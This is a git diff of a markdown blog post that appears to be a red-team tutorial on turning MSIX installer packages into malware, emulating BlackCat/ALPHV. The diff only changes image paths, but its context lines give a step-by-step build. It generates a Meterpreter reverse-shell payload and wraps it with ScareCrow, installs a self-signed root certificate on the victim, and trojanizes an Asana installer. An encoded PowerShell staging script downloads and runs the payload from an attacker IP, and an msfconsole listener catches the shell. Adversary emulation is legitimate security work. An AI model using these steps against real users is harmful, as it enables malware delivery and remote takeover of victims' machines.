@@ -44,6 +44,8 @@ tags:
 
 ![image](/posts/2024-06-11_red_team06/images/logo.png)
 
+
+
 ## Introduction
 
 - I recently worked on a project involving adversary emulation of the `BlackCat/ALPHV ransomware operation`. Part of the observed TTPs was abuse of the MSIX file format to create malware for initial access. These files come in (.msix) file extension which is a Windows installer package.
@@ -57,7 +59,7 @@ tags:
 - The general MSIX file format can be deconstructed as shown:
 
 <div class="center">
-<img src="/posts/2024-06-11_asd/images/msix.png"> 
+<img src="/posts/2024-06-11_red_team06/images/msix.png"> 
 </div>
 
 ### 1. Package Payload
@@ -79,7 +81,7 @@ tags:
 - It allows for extensive configuration to tailor the behaviour of applications. This customization allows resolving of specific compatibility issues without needing to modify the original code.
 
 <div class="center">
-<img src="/posts/2024-06-11_asd/images/psf.png"> 
+<img src="/posts/2024-06-11_red_team06/images/psf.png"> 
 </div>
 
 - In the diagram above, we see the interaction between the PSF and the packaged application at runtime. Let's discuss the various components.
@@ -102,7 +104,7 @@ sample </a> from malwarebazaar.
 - Once you've downloaded and unzipped the sample, you will be presented with the following folder structure
 
 <div class="center">
-<img src="/posts/2024-06-11_asd/images/unzippedmsix.png"> 
+<img src="/posts/2024-06-11_red_team06/images/unzippedmsix.png"> 
 </div>
 
 - In this example, the packaged msix does not contain the target application being installed (it was probably omitted by the original poster) but, it utilizes the Package Support Framework. We can see the psflauncher and the necessary DLLs to ensure its correct functionality. So we know that the malware is going to be executing a script when it is installed on a system.
@@ -119,7 +121,7 @@ sample </a> from malwarebazaar.
 - I highlighted 2 important sections here. The properties and the applications section.
 
 <div class="center">
-<img src="/posts/2024-06-11_asd/images/appxmanifest.png"> 
+<img src="/posts/2024-06-11_red_team06/images/appxmanifest.png"> 
 </div>
 
 - The `properties` section contains details identifying the application such as the name, description and the logo that the app uses.
@@ -131,7 +133,7 @@ sample </a> from malwarebazaar.
 - This is where things start to get interesting. We can see the various parameters being used in the configuration
 
 <div class="center">
-<img src="/posts/2024-06-11_asd/images/configfile.png"> 
+<img src="/posts/2024-06-11_red_team06/images/configfile.png"> 
 </div>
 
 
@@ -146,7 +148,7 @@ sample </a> from malwarebazaar.
 - The `StartingScriptWrapper` is required by the PSF to be able to run the target script. The file below is included by default without any special modifications.
 
 <div class="center">
-<img src="/posts/2024-06-11_asd/images/startingsciptwrapper.png"> 
+<img src="/posts/2024-06-11_red_team06/images/startingsciptwrapper.png"> 
 </div>
 
 
@@ -175,7 +177,7 @@ sample </a> from malwarebazaar.
 - First, you will need to install the `MSIX packaging tool` from the Microsoft Store
 
 <div class="center">
-<img src="/posts/2024-06-11_asd/images/msixpackagingtool.png"> 
+<img src="/posts/2024-06-11_red_team06/images/msixpackagingtool.png"> 
 </div>
 
 - You will also need the target application being packaged. I used Asana for this example.
@@ -195,13 +197,13 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.75.128 LPORT=9001 
 ./scarecrow -I protection.bin -domain www.microsoft.com -encryptionmode AES 
 
 ```
-<img src="/posts/2024-06-11_asd/images/scarecroww.png"> 
+<img src="/posts/2024-06-11_red_team06/images/scarecroww.png"> 
 
 - Host the final loader
 
 
 
-<img src="/posts/2024-06-11_asd/images/server.png"> 
+<img src="/posts/2024-06-11_red_team06/images/server.png"> 
 
 
 
@@ -238,20 +240,20 @@ Export-PfxCertificate -Password $password -cert "Cert:\CurrentUser\My\1BB13615AD
 Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BBE95D792" -FilePath 'C:\Users\Saudi\cert.cer'
 ```
 
-<img src="/posts/2024-06-11_asd/images/certificate.png"> 
+<img src="/posts/2024-06-11_red_team06/images/certificate.png"> 
 
 - Since this is a self-signed SSL for testing purposes, you can install the security certificate on the victim as shown:
 
-<img src="/posts/2024-06-11_asd/images/installcert.png"> 
+<img src="/posts/2024-06-11_red_team06/images/installcert.png"> 
 
 
-<img src="/posts/2024-06-11_asd/images/localmachine.png">
+<img src="/posts/2024-06-11_red_team06/images/localmachine.png">
 
 
 
 - Install the cert in the Trusted Root Certification Authorities
 
-<img src="/posts/2024-06-11_asd/images/rootcert.png"> 
+<img src="/posts/2024-06-11_red_team06/images/rootcert.png"> 
 
 
 
@@ -259,34 +261,34 @@ Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BB
 
 - Select the task and follow through the prompts
 
-<img src="/posts/2024-06-11_asd/images/msixpackage1.png"> 
+<img src="/posts/2024-06-11_red_team06/images/msixpackage1.png"> 
 
 - Select the Asana setup file as the installer being packaged and select the pfx certificate we generated.
 
-<img src="/posts/2024-06-11_asd/images/asanainstaller.png"> 
+<img src="/posts/2024-06-11_red_team06/images/asanainstaller.png"> 
 
 
 - You can skip the Accelerator section. The package will automatically install in the system as shown
 
 
-<img src="/posts/2024-06-11_asd/images/installation.png">
+<img src="/posts/2024-06-11_red_team06/images/installation.png">
 
 - Ensure the package has an entry point as shown. We will edit the entry point in the manifest file later on to point to our psflauncher executable
 
-<img src="/posts/2024-06-11_asd/images/entrypoint.png">
+<img src="/posts/2024-06-11_red_team06/images/entrypoint.png">
 
 - Here in the Create New Package Section, we go to the package editor to add the PSF binaries and config file to our package to give it PSF support.
 
 
-<img src="/posts/2024-06-11_asd/images/packageeditor.png">
+<img src="/posts/2024-06-11_red_team06/images/packageeditor.png">
 
 
 - In the package editor, click on package files, right-click on the "Package" and add the following appropriate files
 
 
-<img src="/posts/2024-06-11_asd/images/rightclick.png" width=1000px;>
+<img src="/posts/2024-06-11_red_team06/images/rightclick.png" width=1000px;>
 
-<img src="/posts/2024-06-11_asd/images/filestocopy.png" width=1000px;>
+<img src="/posts/2024-06-11_red_team06/images/filestocopy.png" width=1000px;>
 
 - You can edit files directly in the package editor by right-clicking and selecting edit. Let's modify the config file to point to our staging script called Hotfix.ps1. In this example, I enabled the powershell window to debug any errors. 
 
@@ -311,7 +313,7 @@ Export-Certificate -cert "Cert:\CurrentUser\My\1BB13615AD20D8101348EA03BC077E0BB
 ```
 - Create the `hotfix.ps1` file in a different window. We will add a powershell command that pulls our loader from the staging server and executes it
 
-<img src="/posts/2024-06-11_asd/images/cyberchef.png" width=1000px;>
+<img src="/posts/2024-06-11_red_team06/images/cyberchef.png" width=1000px;>
 
 ```powershell
 powershell -enc "dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADEAMgA4AC8AMgA0ADoAOQAwADAAMQAvAEgAbwB0AGYAaQB4AC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA7AFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADUAOwBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwASABvAHQAZgBpAHgALgBlAHgAZQA="
@@ -319,19 +321,19 @@ powershell -enc "dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADcANQAuADE
 
 - Add the `hotfix.ps1` staging script
 
-<img src="/posts/2024-06-11_asd/images/hotfix.png" width=1000px;>
+<img src="/posts/2024-06-11_red_team06/images/hotfix.png" width=1000px;>
 
 - Back to the manifest file, let's change the launch executable to our PSF binary so that the hotfix.ps1 can be executed post install
 
-<img src="/posts/2024-06-11_asd/images/manifest.png">
+<img src="/posts/2024-06-11_red_team06/images/manifest.png">
 
 - In this section, take note of the Application ID defined. We will also modify the executable value
 
-<img src="/posts/2024-06-11_asd/images/entrypoint1.png">
+<img src="/posts/2024-06-11_red_team06/images/entrypoint1.png">
 
 - Change it to point to the psf executable:
 
-<img src="/posts/2024-06-11_asd/images/psflauncher.png">
+<img src="/posts/2024-06-11_red_team06/images/psflauncher.png">
 
 - Save and exit. Finally create your MSIX file.
 
@@ -342,7 +344,7 @@ Ensure that the Asana application is not installed in the system
 {{< /alert >}}
 
 
-<img src="/posts/2024-06-11_asd/images/asanainstaller2.png">
+<img src="/posts/2024-06-11_red_team06/images/asanainstaller2.png">
 
 
 - Setup our listener
@@ -351,10 +353,10 @@ Ensure that the Asana application is not installed in the system
 msfconsole -qx "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.71;set LPORT 9001; set EXITFUNC thread; set EXITONSESSION false; exploit -j" 2>&1
 ```
 
-<img src="/posts/2024-06-11_asd/images/listener.png">
+<img src="/posts/2024-06-11_red_team06/images/listener.png">
 
 - Run the MSIX installation and catch your shell
 
-<img src="/posts/2024-06-11_asd/images/session1.png">
+<img src="/posts/2024-06-11_red_team06/images/session1.png">
 
 - Happy hacking!
